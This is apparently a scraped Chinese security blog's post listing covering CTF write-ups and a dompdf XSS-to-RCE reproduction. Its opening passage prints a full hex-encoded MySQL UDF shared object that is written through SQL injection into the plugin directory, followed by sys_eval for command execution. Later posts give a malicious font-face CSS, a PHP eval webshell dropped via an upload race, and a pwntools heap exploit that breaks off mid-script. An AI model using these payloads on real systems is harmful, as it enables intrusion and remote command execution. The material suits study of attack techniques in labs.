所以使用导出表udf\n我们利用下面的代码去替换掉so文件\n-1 and 1=2 union select 1,2;select unhex(\u0026#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400\u0026#39;) into dumpfile \u0026#39;/mysql/plugin/1.so\u0026#39;; 找到配置文件路径\npostman发包\ncreate function sys_eval returns string soname \u0026#39;mysqludf.so\u0026#39;; select sys_eval(\u0026#39;whoami\u0026#39;); 并创建一个命令执行函数\n直接利用即可 flag{testflag}\n","date":"13 September 2023","externalUrl":null,"permalink":"/posts/lolita-n1/","section":"Posts","summary":"","title":"udf导出表","type":"posts"},{"content":"从XSS到 RCE (dompdf 0day) #\r首先进入：https://github.com/positive-security/dompdf-rce 下载必要的源码\n复现系统：kali 2022.1\n话不多说直接开始： 配置环境：\ncd application // php -S localhost:9000 cd expliot php -S localhost:9001 正常访问 发现： 我们加入title的时候会改变上面的回显 尝试xss 发现可以 鉴于该站点没有在客户端的浏览器中存储任何敏感信息（例如身份验证 cookie），这本身就是一个低严重性的发现。\n然后我们输入playload：\nhttp://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php 发现rce成功！\n分析漏洞点： #\r此时，我们将注意力转移到dompdf 的源代码上，看看我们是否能够找到可以让我们进一步访问服务器的漏洞。\n首先是两个配置：\n在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。\n/** * Enable embedded PHP * * If this setting is set to true then DOMPDF will automatically evaluate * embedded PHP contained within ... tags. * * ==== IMPORTANT ==== * Enabling this for documents you do not trust (e.g. arbitrary remote html * pages) is a security risk. Embedded scripts are run with the same level of * system access available to dompdf. Set this option to false (recommended) * if you wish to process untrusted documents. * * This setting may increase the risk of system exploit. Do not change * this settings without understanding the consequences. Additional * documentation is available on the dompdf wiki at: * * * @var bool */ private $isPhpEnabled = false; 远程资源加载：\n/** * Enable remote file access * * If this setting is set to true, DOMPDF will access remote sites for * images and CSS files as required. * * ==== IMPORTANT ==== * This can be a security risk, in particular in combination with isPhpEnabled and * allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-\u0026gt;load_html(...); * This allows anonymous users to download legally doubtful internet content which on * tracing back appears to being downloaded by your server, or allows malicious php code * in remote html pages to be executed by your server with your account privileges. * * This setting may increase the risk of system exploit. Do not change * this settings without understanding the consequences. Additional * documentation is available on the dompdf wiki at: * * * @var bool */ private $isRemoteEnabled = false; 然后我们可以测试是否这个功能开启 利用xss构造语句：?t=aa\u0026lt;link rel=stylesheet href=\u0026quot;xxxxxxx/test.css\u0026quot;\u0026gt;\u0026amp;pdf\n设置时$isRemoteEnabled（或版本 ≤ 0.8.5，无论此设置如何），dompdf 允许通过 font-face CSS 规则加载自定义字体，如下所示：\n@font-face { font-family:\u0026#39;TestFont\u0026#39;; src:url(\u0026#39;http://attacker.local/test_font.ttf\u0026#39;); font-weight:\u0026#39;normal\u0026#39;; font-style:\u0026#39;normal\u0026#39;; } 当使用外部字体时，dompdf 将其缓存在本地/lib/fonts子目录中，并在dompdf_font_family_cache.phpusing中添加相应的条目saveFontFamilies()。此函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。\n从我们在系统其他地方找到的日志文件中，我们已经怀疑 dompdf 存储在可从 web-root 访问的目录中，实际上在尝试访问字体缓存索引时缺少错误消息似乎表明相同：\n下一步：字体缓存 #\r如果我们不能使用字体缓存索引……我们可以直接使用字体缓存吗？ 看下dompdf如何如何注册新字体(部分，具体在这里\n/** * @param array $style * @param string $remoteFile * @param resource $context * @return bool */ public function registerFont($style, $remoteFile, $context = null) { $fontname = mb_strtolower($style[\u0026#34;family\u0026#34;]); $styleString = $this-\u0026gt;getType(\u0026#34;{$style[\u0026#39;weight\u0026#39;]} {$style[\u0026#39;style\u0026#39;]}\u0026#34;); $fontDir = $this-\u0026gt;options-\u0026gt;getFontDir(); $remoteHash = md5($remoteFile); $prefix = $fontname . \u0026#34;_\u0026#34; . $styleString; $prefix = preg_replace(\u0026#34;[\\\\W]\u0026#34;, \u0026#34;_\u0026#34;, $prefix); $prefix = preg_replace(\u0026#34;/[^-_\\\\w]+/\u0026#34;, \u0026#34;\u0026#34;, $prefix); $localFile = $fontDir . \u0026#34;/\u0026#34; . $prefix . \u0026#34;_\u0026#34; . $remoteHash; $localFile .= \u0026#34;.\u0026#34;.strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION)); // Download the remote file list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context); $localTempFile = @tempnam($this-\u0026gt;options-\u0026gt;get(\u0026#34;tempDir\u0026#34;), \u0026#34;dompdf-font-\u0026#34;); file_put_contents($localTempFile, $remoteFileContent); $font = Font::load($localTempFile); if (!$font) { unlink($localTempFile); return false; } $font-\u0026gt;parse(); $font-\u0026gt;close(); unlink($localTempFile); // Save the changes file_put_contents($localFile, $remoteFileContent); $this-\u0026gt;saveFontFamilies(); return true; } 可以看到，新缓存字体的名字是确定了的，字体名称，**样式,MD5(RemoteURL)**这三个组成，比如，url是这样:http://attacker.local/test_font.ttf样式为normal，那么将被存为：testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf\n那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。\n但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合ttf的文件头标准，仍可被解析。\n下面是构造的css以及ttf(php)：\n@font-face { font-family:\u0026#39;exploitfont\u0026#39;; src:url(\u0026#39;http://localhost:9001/exploit_font.php\u0026#39;); font-weight:\u0026#39;normal\u0026#39;; font-style:\u0026#39;normal\u0026#39;; } ttf结构网上搜就有了\nttf文件结构 https://juejin.cn/post/7010064099027451912 原文地址：https://positive.security/blog/dompdf-rce\n","date":"13 September 2023","externalUrl":null,"permalink":"/posts/xss-to-rce/","section":"Posts","summary":"","title":"从XSS到 RCE (dompdf 0day)","type":"posts"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/%E5%A4%8D%E7%8E%B0/","section":"Tags","summary":"","title":"复现","type":"tags"},{"content":"WEB #\r签到include #\r首先进入发现有SICTF传参，并且限制了前三个字符为php 加上这里有include（）可推断为文件包含漏洞 利用php伪协议\n得到密文 PD9waHAKJGZpbGVfcGF0aCA9ICIvZmxhZyI7CmlmIChmaWxlX2V4aXN0cygkZmlsZV9wYXRoKSkgewogICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsKfQplbHNlewogICAgZWNobyAiZXJyb3IiOwp9Cg==\nbase64解密\n\u0026lt;?php $file_path = \u0026#34;/flag\u0026#34;; if (file_exists($file_path)) { $flag = file_get_contents($file_path); } else{ echo \u0026#34;error\u0026#34;; ?\u0026gt; 可见直接读flag目录即可得到flag 解码得到 SICTF{ed2cb4ee-506f-47a8-821e-eb222183bad6}\nPHP_baby #\r进来先看源代码 发现对key做了限制 参考文章：https://blog.csdn.net/mochu7777777/article/details/115050295 绕过 然后这里一眼无参数rce 参考：https://zhuanlan.zhihu.com/p/157431794\nBABY_PHP #\r看到对，和（做了限制 绕过 然后试着读flag 发现为空，所以决定看页面源代码 所以这个和include那道题一样直接cat /flag就行\n拿到flag\n你能跟得上我的speed吗、 #\r进来首先随便上传一个文件 发现被秒删 然后思路就是条件竞争 上传4.php\n\u0026lt;?php file_put_contents(\u0026#34;1.php\u0026#34;,\u0026#39;\u0026lt;?php eval($_GET[\u0026#34;123\u0026#34;]);?\u0026gt;\u0026#39;); echo \u0026#34;success\u0026#34;; ?\u0026gt; burp一直发包然后写一个python\u0026rsquo;一直读这个文件\nimport requests while 1: requests.get(\u0026#34;http://210.44.151.51:10441/uploads/4.php\u0026#34;) print(\u0026#34;test\u0026#34;) playload：http://210.44.151.51:10441/uploads/1.php?123=phpinfo();\nhttp://210.44.151.51:10441/uploads/1.php?123=echo%20`cat%20/flag; RE #\r拿到一个文件 直接txt查看 get flag\nvirus #\r因为主办方不查wp，所以那边只要求交部分图片 so，没有写wp 社工 #\r购物之旅 #\r看见活动 查找 发现在顺义金街\n然后再看到BHG直接查询\n找到地址 北京市顺义区新顺南大街北京华联顺义金街购物中心\n天桥 #\r根据图片判断 1旁边为公交车2公家车专用车道城市有北京，天津，贵阳，郑州，大连，杭州，海口，南京，武汉，乌鲁木齐，厦门，西安，沈阳，银川，民和，上海，深圳3中间护栏为金色4护栏底座有平行花纹，柱头为金字塔形状，侧面大孩子有个圆形或人形图案5在网上查找照片仔细对比，符合上述条件为西安市政护栏5从西安寻找并仔细对比6从图片看出道路两旁树叶形状推断树大概为梧桐树7从上述条件查找得出答案\n群里有人说是余出的题看qq空间判断是陕西\n然后在地图上对比得出答案\n陕西省西安市碑林区友谊西路\n美丽的月光 #\r4.89 QkP:/ 复制打开抖音，看看# 网络迷踪 # 推理 # 冯柯南 网络迷踪：推理中环环相扣的逻辑 遗憾这是一次几乎失败的挑战 # \u0026hellip; https://v.douyin.com/ieAjDv3B/\n重庆市合川区秋季\n宝塔镇河妖 #\r百度识图 直接找地点宝相寺\n山东省济宁市汶上县\n美女姐姐 #\r百度识图 定位直接看 然后周围的公园 福建省福州市仓山区烟台山公园\npwn #\r签到 #\r打开判断为下溢\n直接nc ip port\n买2**32-1000个 直接买flag BABY_HEAP #\rIDA启动 先申请16个堆块控制chunk_size作为伪块头\n0x100刚好溢出 能够在里面写0 然后house of orange手法拿到一块unsorted bin里的块 之后执行unsorted bin，拿下之前在块表里的伪块 unsorted bin attack* 之后利用got表拆出malloc地址 泄露libc 最后把malloc搞到one gadget上就能getshell\nfrom pwn import * context.terminal = [\u0026#39;konsole\u0026#39;, \u0026#39;-e\u0026#39;] context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#34;./baby_heap\u0026#34;) p = remote(\u0026#34;210.44.151.51\u0026#34;, 10069) elf = ELF(\u0026#34;./baby_heap\u0026#34;) def add(size, content): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;1\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(size)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(content) def edit(idx, size, content): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;2\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(idx)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(size)) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(content) def show(idx): p.recvuntil(\u0026#34;\u0026gt;\\n\u0026#34;) p.sendline(\u0026#34;3\u0026#34;) p.recvuntil(\u0026#34;:\\n\u0026#34;) p.sendline(str(idx)) return u64(p.recv(8)) # Construct chunk_size for i in range(16): add(0x100, \u0026#34;owo\u0026#34;) 